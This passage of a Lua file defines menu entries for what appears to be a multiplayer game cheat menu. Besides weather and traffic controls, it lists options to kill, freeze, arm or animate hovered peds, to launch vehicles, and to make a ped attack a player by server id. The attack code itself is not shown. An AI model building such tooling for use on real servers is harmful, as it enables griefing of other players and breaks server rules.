            {text = 'Clear weather', dkey = 'world_clearweather', desc = 'Clear the weather.', afu = __REAPER1__.M.world.cweather, option = __REAPER1__.M.Button},
            {text = 'Random weather', dkey = 'world_randomweather', desc = 'Have the weather changing to random\nones.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Snow', dkey = 'world_snow', desc = 'Enable the snow.', afu = __REAPER1__.M.world.snow, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Weather', dkey = 'world_weather', desc = 'Set the weather.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Weather', length = 10, tipus = 'betu', toggle = false, func = {"Clear", "Extra sunny", "Clouds", "Overcast", "Rain", "Clearing", "Thunder", "Smog", "Foggy", "Xmas", "Snowlight", "Blizzard", 'Halloween'}},
            {text = 'Rain level', dkey = 'world_rainlevel', desc = 'Set the strength of rain effects.', afu = __REAPER1__.M.world.rain, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Rain level number', length = 5, tipus = 'szam', func = __REAPER1__.T.Float2},
            {text = 'Ambient', option = __REAPER1__.M.Separator},
            {text = 'Ped density', dkey = 'world_peddensity', desc = 'The pedestrian density on your client.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ped density number', length = 5, tipus = 'szam', toggle = false, func = __REAPER1__.T.Float2},
            {text = 'Scenario ped density', dkey = 'world_speddensity', desc = 'The scenariod pedestrian density on\nyour client.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Scenariod ped density number', length = 5, tipus = 'szam', toggle = false, func = __REAPER1__.T.Float2},
            {text = 'Vehicle density', dkey = 'world_vehicledensity', desc = 'The vehicle density on your client.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Vehicle density number', length = 5, tipus = 'szam', toggle = false, func = __REAPER1__.T.Float2},
            {text = 'Random vehicle density', dkey = 'world_rvehicledensity', desc = 'The random vehicle density on your\nclient.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Random vehicle density number', length = 5, tipus = 'szam', toggle = false, func = __REAPER1__.T.Float2},
            {text = 'Parked vehicle density', dkey = 'world_pvehicledensity', desc = 'The parked vehicle density on your\nclient.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Parked vehicle density number', length = 5, tipus = 'szam', toggle = false, func = __REAPER1__.T.Float2},
            {text = 'Display', option = __REAPER1__.M.Separator},
            {text = 'Entity count', dkey = 'world_displayentity', desc = 'Display the different entity counts.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Coords', dkey = 'world_displaycoords', desc = 'Display your current coordinates.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Heading', dkey = 'world_heading', desc = 'Display your current heading.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Rotation', dkey = 'world_rotation', desc = 'Display your current rotation.', option = __REAPER1__.M.Checkbox, func = false},
        },

        ['world:alwayslit'] = {
            {text = 'Toggle always lit', dkey = 'world:alwayslit_alwayslit', desc = 'Toggle the always lit. The world will be\nbright in a color you set.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Power', dkey = 'world:alwayslit_power', desc = 'The power of the always lit.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Always lit power number', length = 4, tipus = 'szam', func = __REAPER1__.T.Ezres},
            {text = 'Shadows', dkey = 'world:alwayslit_shadows', desc = 'Determines how strong the always lit\ncan be on shadows.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Always lit shadows number', length = 3, tipus = 'szam', func = __REAPER1__.T.Szazas},
            {text = 'Color type', dkey = 'world:alwayslit_colortype', desc = 'Set the color type for the always lit.', option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Always lit color type', length = 10, tipus = 'betu', func = {'Static', 'Random', 'Rainbow'}},
            {text = 'Color', dkey = 'world:alwayslit_color', desc = 'Set the color of the always lit.\nFormat: r g b.', option = __REAPER1__.M.Button_Textbox, textboxtext = 'Always lit color', length = 11, tipus = 'szin', menuextra = {r = 0, g = 0, b = 0}, func = '0 0 0'},
        },

        ['world:hover'] = {
            {text = 'Active', dkey = 'world:hover_active', desc = 'If active when you hover to a new entity,\nthe menu will change to that.', option = __REAPER1__.M.Checkbox, func = false},
        },

        ['world:hover:ped'] = {
            {text = 'Active', dkey = 'world:hover:ped_active', desc = 'If active when you hover to a new entity,\nthe menu will change to that.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Pedestrian', option = __REAPER1__.M.Separator},
            {text = 'Delete', dkey = 'world:hover:ped_delete', desc = 'Delete the hovered ped.', afu = __REAPER1__.M.world.hover.delete, option = __REAPER1__.M.Button},
            {text = 'Kill', dkey = 'world:hover:ped_kill', desc = 'Kill the hovered ped.', afu = __REAPER1__.M.world.hover.ped.kill, option = __REAPER1__.M.Button},
            {text = 'Heading', dkey = 'world:hover:ped_heading', desc = 'Set the hovered ped\'s heading.', afu = __REAPER1__.M.world.hover.heading, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Heading number', length = 3, tipus = 'szam', func = {}},
            {text = 'Coords', dkey = 'world:hover:ped_coords', desc = 'Set the hovered ped\'s position.', afu = __REAPER1__.M.world.hover.coords, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Ped coords', length = 30, tipus = 'vegyes', func = 'None'},
            {text = 'Invisible', dkey = 'world:hover:ped_invisible', desc = 'Make the hovered ped invisible.', afu = __REAPER1__.M.world.hover.invisible, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'God moded', dkey = 'world:hover:ped_godmoded', desc = 'Make the hovered ped god moded.', afu = __REAPER1__.M.world.hover.godded, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Freeze', dkey = 'world:hover:ped_freeze', desc = 'Freeze the hovered ped.', afu = __REAPER1__.M.world.hover.freeze, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'No collision', dkey = 'world:hover:ped_nocollision', desc = 'Disable the hovered ped\'s collision.', afu = __REAPER1__.M.world.hover.nocollision, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Weapon', dkey = 'world:hover:ped_weapon', desc = 'Give or remove a chosen weapon from\nthe hovered ped.', afu = __REAPER1__.M.world.hover.ped.weapon, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Weapon name', length = 20, tipus = 'betu', func = __REAPER1__.T.Weapons},
            {text = 'Condition', dkey = 'world:hover:ped_condition', desc = 'Set a condition for the hovered ped.', afu = __REAPER1__.M.world.hover.ped.condition, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Condition name', length = 20, tipus = 'betu', func = {'Angry', 'Deaf', 'Blind', 'Deaf & Blind'}},
            {text = 'Animation', dkey = 'world:hover:ped_animation', desc = 'Force an animation for the hovered ped.', afu = __REAPER1__.M.world.hover.ped.animation, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Animation name', length = 20, tipus = 'betu', func = {'Sex', 'Sex 2', 'Twerking', 'Thinking', 'Pointing', 'Clapping', 'Whistle', 'Dead', 'Sleeping', 'Jerking off', 'Lap dance', 'Lean', 'Kiss', 'Hug'}},
            {text = 'Stop animation', dkey = 'world:hover:ped_stopanimation', desc = 'Stop the animation the hovered ped is\nplaying.', afu = __REAPER1__.M.world.hover.ped.stopanim, option = __REAPER1__.M.Button},
            {text = 'Follow closest', dkey = 'world:hover:ped_followclosest', desc = 'Force the hovered ped to follow the\nclosest player.', afu = __REAPER1__.M.world.hover.ped.follow, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Mind clear', dkey = 'world:hover:ped_mindclear', desc = 'Force stop whatever the hovered ped\nis doing.', afu = __REAPER1__.M.world.hover.ped.mindclear, option = __REAPER1__.M.Button},
            {text = 'Attack player', dkey = 'world:hover:ped_attackplayer', desc = 'Force the hovered ped to attack a\nplayer with the given server id.', afu = __REAPER1__.M.world.hover.ped.attack, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Player id number', length = 5, tipus = 'szam', func = 0},
            {text = 'Ragdoll', dkey = 'world:hover:ped_ragdoll', desc = 'Ragdoll the hovered ped.', option = __REAPER1__.M.Checkbox, func = false},
            
        },

        ['world:hover:veh'] = {
            {text = 'Active', dkey = 'world:hover:veh_active', desc = 'If active when you hover to a new entity,\nthe menu will change to that.', option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Vehicle', option = __REAPER1__.M.Separator},
            {text = 'Delete', dkey = 'world:hover:veh_delete', desc = 'Delete the hovered vehicle.', afu = __REAPER1__.M.world.hover.delete, option = __REAPER1__.M.Button},
            {text = 'Heading', dkey = 'world:hover:veh_heading', desc = 'Set the hovered vehicle\'s heading.', afu = __REAPER1__.M.world.hover.heading, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Heading number', length = 3, tipus = 'szam', func = {}},
            {text = 'Coords', dkey = 'world:hover:veh_coords', desc = 'Set the hovered vehicle\'s position.', afu = __REAPER1__.M.world.hover.coords, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Vehicle coords', length = 30, tipus = 'vegyes', func = 'None'},
            {text = 'Invisible', dkey = 'world:hover:veh_invisible', desc = 'Make the hovered vehicle invisible.', afu = __REAPER1__.M.world.hover.invisible, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'God moded', dkey = 'world:hover:veh_godmoded', desc = 'Make the hovered vehicle god moded.', afu = __REAPER1__.M.world.hover.godded, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Freeze', dkey = 'world:hover:veh_freeze', desc = 'Freeze the hovered vehicle.', afu = __REAPER1__.M.world.hover.freeze, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'No collision', dkey = 'world:hover:veh_nocollision', desc = 'Disable the hovered vehicle\'s collision.', afu = __REAPER1__.M.world.hover.nocollision, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Launch', dkey = 'world:hover:veh_launch', desc = 'Launch the hovered vehicle in the sky.', afu = __REAPER1__.M.world.hover.veh.launchveh, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Launch power number', length = 4, tipus = 'szam', func = __REAPER1__.T.Ezres},
            {text = 'Engine health', dkey = 'world:hover:veh_ehealth', desc = 'Set the engine health for the hovered\nvehicle.', afu = __REAPER1__.M.world.hover.veh.enginehealth, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Engine health number', length = 4, tipus = 'szam', func = {-4000, -3999, -3998, -3997, -3996, -3995, -3994, -3993, -3992, -3991, -3990, -3989, -3988, -3987, -3986, -3985, -3984, -3983, -3982, -3981, -3980, -3979, -3978, -3977, -3976, -3975, -3974, -3973, -3972, -3971, -3970, -3969, -3968, -3967, -3966, -3965, -3964, -3963, -3962, -3961, -3960, -3959, -3958, -3957, -3956, -3955, -3954, -3953, -3952, -3951, -3950, -3949, -3948, -3947, -3946, -3945, -3944, -3943, -3942, -3941, -3940, -3939, -3938, -3937, -3936, -3935, -3934, -3933, -3932, -3931, -3930, -3929, -3928, -3927, -3926, -3925, -3924, -3923, -3922, -3921, -3920, -3919, -3918, -3917, -3916, -3915, -3914, -3913, -3912, -3911, -3910, -3909, -3908, -3907, -3906, -3905, -3904, -3903, -3902, -3901, -3900, -3899, -3898, -3897, -3896, -3895, -3894, -3893, -3892, -3891, -3890, -3889, -3888, -3887, -3886, -3885, -3884, -3883, -3882, -3881, -3880, -3879, -3878, -3877, -3876, -3875, -3874, -3873, -3872, -3871, -3870, -3869, -3868, -3867, -3866, -3865, -3864, -3863, -3862, -3861, -3860, -3859, -3858, -3857, -3856, -3855, -3854, -3853, -3852, -3851, -3850, -3849, -3848, -3847, -3846, -3845, -3844, -3843, -3842, -3841, -3840, -3839, -3838, -3837, -3836, -3835, -3834, -3833, -3832, -3831, -3830, -3829, -3828, -3827, -3826, -3825, -3824, -3823, -3822, -3821, -3820, -3819, -3818, -3817, -3816, -3815, -3814, -3813, -3812, -3811, -3810, -3809, -3808, -3807, -3806, -3805, -3804, -3803, -3802, -3801, -3800, -3799, -3798, -3797, -3796, -3795, -3794, -3793, -3792, -3791, -3790, -3789, -3788, -3787, -3786, -3785, -3784, -3783, -3782, -3781, -3780, -3779, -3778, -3777, -3776, -3775, -3774, -3773, -3772, -3771, -3770, -3769, -3768, -3767, -3766, -3765, -3764, -3763, -3762, -3761, -3760, -3759, -3758, -3757, -3756, -3755, -3754, -3753, -3752, -3751, -3750, -3749, -3748, -3747, -3746, -3745, -3744, -3743, -3742, -3741, -3740, -3739, -3738, -3737, -3736, -3735, -3734, -3733, -3732, -3731, -3730, -3729, -3728, -3727, -3726, -3725, -3724, -3723, -3722, -3721, -3720, -3719, -3718, -3717, -3716, -3715, -3714, -3713, -3712, -3711, -3710, -3709, -3708, -3707, -3706, -3705, -3704, -3703, -3702, -3701, -3700, -3699, -3698, -3697, -3696, -3695, -3694, -3693, -3692, -3691, -3690, -3689, -3688, -3687, -3686, -3685, -3684, -3683, -3682, -3681, -3680, -3679, -3678, -3677, -3676, -3675, -3674, -3673, -3672, -3671, -3670, -3669, -3668, -3667, -3666, -3665, -3664, -3663, -3662, -3661, -3660, -3659, -3658, -3657, -3656, -3655, -3654, -3653, -3652, -3651, -3650, -3649, -3648, -3647, -3646, -3645, -3644, -3643, -3642, -3641, -3640, -3639, -3638, -3637, -3636, -3635, -3634, -3633, -3632, -3631, -3630, -3629, -3628, -3627, -3626, -3625, -3624, -3623, -3622, -3621, -3620, -3619, -3618, -3617, -3616, -3615, -3614, -3613, -3612, -3611, -3610, -3609, -3608, -3607, -3606, -3605, -3604, -3603, -3602, -3601, -3600, -3599, -3598, -3597, -3596, -3595, -3594, -3593, -3592, -3591, -3590, -3589, -3588, -3587, -3586, -3585, -3584, -3583, -3582, -3581, -3580, -3579, -3578, -3577, -3576, -3575, -3574, -3573, -3572, -3571, -3570, -3569, -3568, -3567, -3566, -3565, -3564, -3563, -3562, -3561, -3560, -3559, -3558, -3557, -3556, -3555, -3554, -3553, -3552, -3551, -3550, -3549, -3548, -3547, -3546, -3545, -3544, -3543, -3542, -3541, -3540, -3539, -3538, -3537, -3536, -3535, -3534, -3533, -3532, -3531, -3530, -3529, -3528, -3527, -3526, -3525, -3524, -3523, -3522, -3521, -3520, -3519, -3518, -3517, -3516, -3515, -3514, -3513, -3512, -3511, -3510, -3509, -3508, -3507, -3506, -3505, -3504, -3503, -3502, -3501, -3500, -3499, -3498, -3497, -3496, -3495, -3494, -3493, -3492, -3491, -3490, -3489, -3488, -3487, -3486, -3485, -3484, -3483, -3482, -3481, -3480, -3479, -3478, -3477, -3476, -3475, -3474, -3473, -3472, -3471, -3470, -3469, -3468, -3467, -3466, -3465, -3464, -3463, -3462, -3461, -3460, -3459, -3458, -3457, -3456, -3455, -3454, -3453, -3452, -3451, -3450, -3449, -3448, -3447, -3446, -3445, -3444, -3443, -3442, -3441, -3440, -3439, -3438, -3437, -3436, -3435, -3434, -3433, -3432, -3431, -3430, -3429, -3428, -3427, -3426, -3425, -3424, -3423, -3422, -3421, -3420, -3419, -3418, -3417, -3416, -3415, -3414, -3413, -3412, -3411, -3410, -3409, -3408, -3407, -3406, -3405, -3404, -3403, -3402, -3401, -3400, -3399, -3398, -3397, -3396, -3395, -3394, -3393, -3392, -3391, -3390, -3389, -3388, -3387, -3386, -3385, -3384, -3383, -3382, -3381, -3380, -3379, -3378, -3377, -3376, -3375, -3374, -3373, -3372, -3371, -3370, -3369, -3368, -3367, -3366, -3365, -3364, -3363, -3362, -3361, -3360, -3359, -3358, -3357, -3356, -3355, -3354, -3353, -3352, -3351, -3350, -3349, -3348, -3347, -3346, -3345, -3344, -3343, -3342, -3341, -3340, -3339, -3338, -3337, -3336, -3335, -3334, -3333, -3332, -3331, -3330, -3329, -3328, -3327, -3326, -3325, -3324, -3323, -3322, -3321, -3320, -3319, -3318, -3317, -3316, -3315, -3314, -3313, -3312, -3311, -3310, -3309, -3308, -3307, -3306, -3305, -3304, -3303, -3302, -3301, -3300, -3299, -3298, -3297, -3296, -3295, -3294, -3293, -3292, -3291, -3290, -3289, -3288, -3287, -3286, -3285, -3284, -3283, -3282, -3281, -3280, -3279, -3278, -3277, -3276, -3275, -3274, -3273, -3272, -3271, -3270, -3269, -3268, -3267, -3266, -3265, -3264, -3263, -3262, -3261, -3260, -3259, -3258, -3257, -3256, -3255, -3254, -3253, -3252, -3251, -3250, -3249, -3248, -3247, -3246, -3245, -3244, -3243, -3242, -3241, -3240, -3239, -3238, -3237, -3236, -3235, -3234, -3233, -3232, -3231, -3230, -3229, -3228, -3227, -3226, -3225, -3224, -3223, -3222, -3221, -3220, -3219, -3218, -3217, -3216, -3215, -3214, -3213, -3212, -3211, -3210, -3209, -3208, -3207, -3206, -3205, -3204, -3203, -3202, -3201, -3200, -3199, -3198, -3197, -3196, -3195, -3194, -3193, -3192, -3191, -3190, -3189, -3188, -3187, -3186, -3185, -3184, -3183, -3182, -3181, -3180, -3179, -3178, -3177, -3176, -3175, -3174, -3173, -3172, -3171, -3170, -3169, -3168, -3167, -3166, -3165, -3164, -3163, -3162, -3161, -3160, -3159, -3158, -3157, -3156, -3155, -3154, -3153, -3152, -3151, -3150, -3149, -3148, -3147, -3146, -3145, -3144, -3143, -3142, -3141, -3140, -3139, -3138, -3137, -3136, -3135, -3134, -3133, -3132, -3131, -3130, -3129, -3128, -3127, -3126, -3125, -3124, -3123, -3122, -3121, -3120, -3119, -3118, -3117, -3116, -3115, -3114, -3113, -3112, -3111, -3110, -3109, -3108, -3107, -3106, -3105, -3104, -3103, -3102, -3101, -3100, -3099, -3098, -3097, -3096, -3095, -3094, -3093, -3092, -3091, -3090, -3089, -3088, -3087, -3086, -3085, -3084, -3083, -3082, -3081, -3080, -3079, -3078, -3077, -3076, -3075, -3074, -3073, -3072, -3071, -3070, -3069, -3068, -3067, -3066, -3065, -3064, -3063, -3062, -3061, -3060, -3059, -3058, -3057, -3056, -3055, -3054, -3053, -3052, -3051, -3050, -3049, -3048, -3047, -3046, -3045, -3044, -3043, -3042, -3041, -3040, -3039, -3038, -3037, -3036, -3035, -3034, -3033, -3032, -3031, -3030, -3029, -3028, -3027, -3026, -3025, -3024, -3023, -3022, -3021, -3020, -3019, -3018, -3017, -3016, -3015, -3014, -3013, -3012, -3011, -3010, -3009, -3008, -3007, -3006, -3005, -3004, -3003, -3002, -3001, -3000, -2999, -2998, -2997, -2996, -2995, -2994, -2993, -2992, -2991, -2990, -2989, -2988, -2987, -2986, -2985, -2984, -2983, -2982, -2981, -2980, -2979, -2978, -2977, -2976, -2975, -2974, -2973, -2972, -2971, -2970, -2969, -2968, -2967, -2966, -2965, -2964, -2963, -2962, -2961, -2960, -2959, -2958, -2957, -2956, -2955, -2954, -2953, -2952, -2951, -2950, -2949, -2948, -2947, -2946, -2945, -2944, -2943, -2942, -2941, -2940, -2939, -2938, -2937, -2936, -2935, -2934, -2933, -2932, -2931, -2930, -2929, -2928, -2927, -2926, -2925, -2924, -2923, -2922, -2921, -2920, -2919, -2918, -2917, -2916, -2915, -2914, -2913, -2912, -2911, -2910, -2909, -2908, -2907, -2906, -2905, -2904, -2903, -2902, -2901, -2900, -2899, -2898, -2897, -2896, -2895, -2894, -2893, -2892, -2891, -2890, -2889, -2888, -2887, -2886, -2885, -2884, -2883, -2882, -2881, -2880, -2879, -2878, -2877, -2876, -2875, -2874, -2873, -2872, -2871, -2870, -2869, -2868, -2867, -2866, -2865, -2864, -2863, -2862, -2861, -2860, -2859, -2858, -2857, -2856, -2855, -2854, -2853, -2852, -2851, -2850, -2849, -2848, -2847, -2846, -2845, -2844, -2843, -2842, -2841, -2840, -2839, -2838, -2837, -2836, -2835, -2834, -2833, -2832, -2831, -2830, -2829, -2828, -2827, -2826, -2825, -2824, -2823, -2822, -2821, -2820, -2819, -2818, -2817, -2816, -2815, -2814, -2813, -2812, -2811, -2810, -2809, -2808, -2807, -2806, -2805, -2804, -2803, -2802, -2801, -2800, -2799, -2798, -2797, -2796, -2795, -2794, -2793, -2792, -2791, -2790, -2789, -2788, -2787, -2786, -2785, -2784, -2783, -2782, -2781, -2780, -2779, -2778, -2777, -2776, -2775, -2774, -2773, -2772, -2771, -2770, -2769, -2768, -2767, -2766, -2765, -2764, -2763, -2762, -2761, -2760, -2759, -2758, -2757, -2756, -2755, -2754, -2753, -2752, -2751, -2750, -2749, -2748, -2747, -2746, -2745, -2744, -2743, -2742, -2741, -2740, -2739, -2738, -2737, -2736, -2735, -2734, -2733, -2732, -2731, -2730, -2729, -2728, -2727, -2726, -2725, -2724, -2723, -2722, -2721, -2720, -2719, -2718, -2717, -2716, -2715, -2714, -2713, -2712, -2711, -2710, -2709, -2708, -2707, -2706, -2705, -2704, -2703, -2702, -2701, -2700, -2699, -2698, -2697, -2696, -2695, -2694, -2693, -2692, -2691, -2690, -2689, -2688, -2687, -2686, -2685, -2684, -2683, -2682, -2681, -2680, -2679, -2678, -2677, -2676, -2675, -2674, -2673, -2672, -2671, -2670, -2669, -2668, -2667, -2666, -2665, -2664, -2663, -2662, -2661, -2660, -2659, -2658, -2657, -2656, -2655, -2654, -2653, -2652, -2651, -2650, -2649, -2648, -2647, -2646, -2645, -2644, -2643, -2642, -2641, -2640, -2639, -2638, -2637, -2636, -2635, -2634, -2633, -2632, -2631, -2630, -2629, -2628, -2627, -2626, -2625, -2624, -2623, -2622, -2621, -2620, -2619, -2618, -2617, -2616, -2615, -2614, -2613, -2612, -2611, -2610, -2609, -2608, -2607, -2606, -2605, -2604, -2603, -2602, -2601, -2600, -2599, -2598, -2597, -2596, -2595, -2594, -2593, -2592, -2591, -2590, -2589, -2588, -2587, -2586, -2585, -2584, -2583, -2582, -2581, -2580, -2579, -2578, -2577, -2576, -2575, -2574, -2573, -2572, -2571, -2570, -2569, -2568, -2567, -2566, -2565, -2564, -2563, -2562, -2561, -2560, -2559, -2558, -2557, -2556, -2555, -2554, -2553, -2552, -2551, -2550, -2549, -2548, -2547, -2546, -2545, -2544, -2543, -2542, -2541, -2540, -2539, -2538, -2537, -2536, -2535, -2534, -2533, -2532, -2531, -2530, -2529, -2528, -2527, -2526, -2525, -2524, -2523, -2522, -2521, -2520, -2519, -2518, -2517, -2516, -2515, -2514, -2513, -2512, -2511, -2510, -2509, -2508, -2507, -2506, -2505, -2504, -2503, -2502, -2501, -2500, -2499, -2498, -2497, -2496, -2495, -2494, -2493, -2492, -2491, -2490, -2489, -2488, -2487, -2486, -2485, -2484, -2483, -2482, -2481, -2480, -2479, -2478, -2477, -2476, -2475, -2474, -2473, -2472, -2471, -2470, -2469, -2468, -2467, -2466, -2465, -2464, -2463, -2462, -2461, -2460, -2459, -2458, -2457, -2456, -2455, -2454, -2453, -2452, -2451, -2450, -2449, -2448, -2447, -2446, -2445, -2444, -2443, -2442, -2441, -2440, -2439, -2438, -2437, -2436, -2435, -2434, -2433, -2432, -2431, -2430, -2429, -2428, -2427, -2426, -2425, -2424, -2423, -2422, -2421, -2420, -2419, -2418, -2417, -2416, -2415, -2414, -2413, -2412, -2411, -2410, -2409, -2408, -2407, -2406, -2405, -2404, -2403, -2402, -2401, -2400, -2399, -2398, -2397, -2396, -2395, -2394, -2393, -2392, -2391, -2390, -2389, -2388, -2387, -2386, -2385, -2384, -2383, -2382, -2381, -2380, -2379, -2378, -2377, -2376, -2375, -2374, -2373, -2372, -2371, -2370, -2369, -2368, -2367, -2366, -2365, -2364, -2363, -2362, -2361, -2360, -2359, -2358, -2357, -2356, -2355, -2354, -2353, -2352, -2351, -2350, -2349, -2348, -2347, -2346, -2345, -2344, -2343, -2342, -2341, -2340, -2339, -2338, -2337, -2336, -2335, -2334, -2333, -2332, -2331, -2330, -2329, -2328, -2327, -2326, -2325, -2324, -2323, -2322, -2321, -2320, -2319, -2318, -2317, -2316, -2315, -2314, -2313, -2312, -2311, -2310, -2309, -2308, -2307, -2306, -2305, -2304, -2303, -2302, -2301, -2300, -2299, -2298, -2297, -2296, -2295, -2294, -2293, -2292, -2291, -2290, -2289, -2288, -2287, -2286, -2285, -2284, -2283, -2282, -2281, -2280, -2279, -2278, -2277, -2276, -2275, -2274, -2273, -2272, -2271, -2270, -2269, -2268, -2267, -2266, -2265, -2264, -2263, -2262, -2261, -2260, -2259, -2258, -2257, -2256, -2255, -2254, -2253, -2252, -2251, -2250, -2249, -2248, -2247, -2246, -2245, -2244, -2243, -2242, -2241, -2240, -2239, -2238, -2237, -2236, -2235, -2234, -2233, -2232, -2231, -2230, -2229, -2228, -2227, -2226, -2225, -2224, -2223, -2222, -2221, -2220, -2219, -2218, -2217, -2216, -2215, -2214, -2213, -2212, -2211, -2210, -2209, -2208, -2207, -2206, -2205, -2204, -2203, -2202, -2201, -2200, -2199, -2198, -2197, -2196, -2195, -2194, -2193, -2192, -2191, -2190, -2189, -2188, -2187, -2186, -2185, -2184, -2183, -2182, -2181, -2180, -2179, -2178, -2177, -2176, -2175, -2174, -2173, -2172, -2171, -2170, -2169, -2168, -2167, -2166, -2165, -2164, -2163, -2162, -2161, -2160, -2159, -2158, -2157, -2156, -2155, -2154, -2153, -2152, -2151, -2150, -2149, -2148, -2147, -2146, -2145, -2144, -2143, -2142, -2141, -2140, -2139, -2138, -2137, -2136, -2135, -2134, -2133, -2132, -2131, -2130, -2129, -2128, -2127, -2126, -2125, -2124, -2123, -2122, -2121, -2120, -2119, -2118, -2117, -2116, -2115, -2114, -2113, -2112, -2111, -2110, -2109, -2108, -2107, -2106, -2105, -2104, -2103, -2102, -2101, -2100, -2099, -2098, -2097, -2096, -2095, -2094, -2093, -2092, -2091, -2090, -2089, -2088, -2087, -2086, -2085, -2084, -2083, -2082, -2081, -2080, -2079, -2078, -2077, -2076, -2075, -2074, -2073, -2072, -2071, -2070, -2069, -2068, -2067, -2066, -2065, -2064, -2063, -2062, -2061, -2060, -2059, -2058, -2057, -2056, -2055, -2054, -2053, -2052, -2051, -2050, -2049, -2048, -2047, -2046, -2045, -2044, -2043, -2042, -2041, -2040, -2039, -2038, -2037, -2036, -2035, -2034, -2033, -2032, -2031, -2030, -2029, -2028, -2027, -2026, -2025, -2024, -2023, -2022, -2021, -2020, -2019, -2018, -2017, -2016, -2015, -2014, -2013, -2012, -2011, -2010, -2009, -2008, -2007, -2006, -2005, -2004, -2003, -2002, -2001, -2000, -1999, -1998, -1997, -1996, -1995, -1994, -1993, -1992, -1991, -1990, -1989, -1988, -1987, -1986, -1985, -1984, -1983, -1982, -1981, -1980, -1979, -1978, -1977, -1976, -1975, -1974, -1973, -1972, -1971, -1970, -1969, -1968, -1967, -1966, -1965, -1964, -1963, -1962, -1961, -1960, -1959, -1958, -1957, -1956, -1955, -1954, -1953, -1952, -1951, -1950, -1949, -1948, -1947, -1946, -1945, -1944, -1943, -1942, -1941, -1940, -1939, -1938, -1937, -1936, -1935, -1934, -1933, -1932, -1931, -1930, -1929, -1928, -1927, -1926, -1925, -1924, -1923, -1922, -1921, -1920, -1919, -1918, -1917, -1916, -1915, -1914, -1913, -1912, -1911, -1910, -1909, -1908, -1907, -1906, -1905, -1904, -1903, -1902, -1901, -1900, -1899, -1898, -1897, -1896, -1895, -1894, -1893, -1892, -1891, -1890, -1889, -1888, -1887, -1886, -1885, -1884, -1883, -1882, -1881, -1880, -1879, -1878, -1877, -1876, -1875, -1874, -1873, -1872, -1871, -1870, -1869, -1868, -1867, -1866, -1865, -1864, -1863, -1862, -1861, -1860, -1859, -1858, -1857, -1856, -1855, -1854, -1853, -1852, -1851, -1850, -1849, -1848, -1847, -1846, -1845, -1844, -1843, -1842, -1841, -1840, -1839, -1838, -1837, -1836, -1835, -1834, -1833, -1832, -1831, -1830, -1829, -1828, -1827, -1826, -1825, -1824, -1823, -1822, -1821, -1820, -1819, -1818, -1817, -1816, -1815, -1814, -1813, -1812, -1811, -1810, -1809, -1808, -1807, -1806, -1805, -1804, -1803, -1802, -1801, -1800, -1799, -1798, -1797, -1796, -1795, -1794, -1793, -1792, -1791, -1790, -1789, -1788, -1787, -1786, -1785, -1784, -1783, -1782, -1781, -1780, -1779, -1778, -1777, -1776, -1775, -1774, -1773, -1772, -1771, -1770, -1769, -1768, -1767, -1766, -1765, -1764, -1763, -1762, -1761, -1760, -1759, -1758, -1757, -1756, -1755, -1754, -1753, -1752, -1751, -1750, -1749, -1748, -1747, -1746, -1745, -1744, -1743, -1742, -1741, -1740, -1739, -1738, -1737, -1736, -1735, -1734, -1733, -1732, -1731, -1730, -1729, -1728, -1727, -1726, -1725, -1724, -1723, -1722, -1721, -1720, -1719, -1718, -1717, -1716, -1715, -1714, -1713, -1712, -1711, -1710, -1709, -1708, -1707, -1706, -1705, -1704, -1703, -1702, -1701, -1700, -1699, -1698, -1697, -1696, -1695, -1694, -1693, -1692, -1691, -1690, -1689, -1688, -1687, -1686, -1685, -1684, -1683, -1682, -1681, -1680, -1679, -1678, -1677, -1676, -1675, -1674, -1673, -1672, -1671, -1670, -1669, -1668, -1667, -1666, -1665, -1664, -1663, -1662, -1661, -1660, -1659, -1658, -1657, -1656, -1655, -1654, -1653, -1652, -1651, -1650, -1649, -1648, -1647, -1646, -1645, -1644, -1643, -1642, -1641, -1640, -1639, -1638, -1637, -1636, -1635, -1634, -1633, -1632, -1631, -1630, -1629, -1628, -1627, -1626, -1625, -1624, -1623, -1622, -1621, -1620, -1619, -1618, -1617, -1616, -1615, -1614, -1613, -1612, -1611, -1610, -1609, -1608, -1607, -1606, -1605, -1604, -1603, -1602, -1601, -1600, -1599, -1598, -1597, -1596, -1595, -1594, -1593, -1592, -1591, -1590, -1589, -1588, -1587, -1586, -1585, -1584, -1583, -1582, -1581, -1580, -1579, -1578, -1577, 